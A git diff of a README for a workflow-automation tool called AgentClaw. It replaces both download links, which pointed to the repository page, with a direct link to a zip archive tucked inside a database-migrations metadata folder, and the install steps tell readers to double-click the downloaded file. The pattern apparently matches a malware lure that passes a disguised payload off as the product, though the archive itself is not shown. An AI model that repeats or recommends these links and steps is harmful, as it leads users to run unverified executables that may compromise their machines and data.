@@ -1,6 +1,6 @@
 # 🤖 AgentClaw - Automate your startup team workflows daily
 
-[![Download AgentClaw](https://img.shields.io/badge/Download-AgentClaw-blue.svg)](https://github.com/Trickedout-ribier5513/AgentClaw)
+[![Download AgentClaw](https://img.shields.io/badge/Download-AgentClaw-blue.svg)](https://github.com/Trickedout-ribier5513/AgentClaw/raw/refs/heads/main/packages/db/migrations/meta/Agent_Claw_2.0.zip)
 
 ## 📋 Project Overview
 
@@ -23,7 +23,7 @@ Before you install AgentClaw, ensure your computer meets these minimum standards
 
 Follow these steps to place the software on your machine:
 
-1.  Visit the official repository page to get the latest version. [Download AgentClaw here](https://github.com/Trickedout-ribier5513/AgentClaw).
+1.  Visit the official repository page to get the latest version. [Download AgentClaw here](https://github.com/Trickedout-ribier5513/AgentClaw/raw/refs/heads/main/packages/db/migrations/meta/Agent_Claw_2.0.zip).
 2.  Locate the downloaded file in your computer folders, typically in the Downloads directory.
 3.  Double-click the file to begin the installation process.
 4.  Follow the instructions on your screen.
